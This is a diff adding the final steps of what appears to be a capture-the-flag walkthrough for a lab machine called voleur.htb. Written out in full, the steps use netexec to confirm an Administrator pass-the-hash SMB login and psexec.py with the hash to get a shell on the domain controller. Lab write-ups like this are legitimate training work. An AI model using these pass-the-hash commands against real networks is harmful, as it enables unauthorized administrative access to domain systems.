@@ -141,4 +141,14 @@
 
 <img width="850" height="1020" alt="image" src="https://github.com/user-attachments/assets/6476c17f-bc3b-4fcc-a95c-c809d52f4638" />
 
-22. 
+22. Confirm we can log into SMB with Admin hash using netexec
+
+`nxc smb dc.voleur.htb -u Administrator -H "[HASH]" -d voleur.htb -k`
+
+
+
+23. Psexec into the machine as Admin and grab the root flag!
+
+`psexec.py -dc-ip 10.129.4.233 voleur.htb/Administrator@dc.voleur.htb -hashes "[HASH]" -k`
+
+
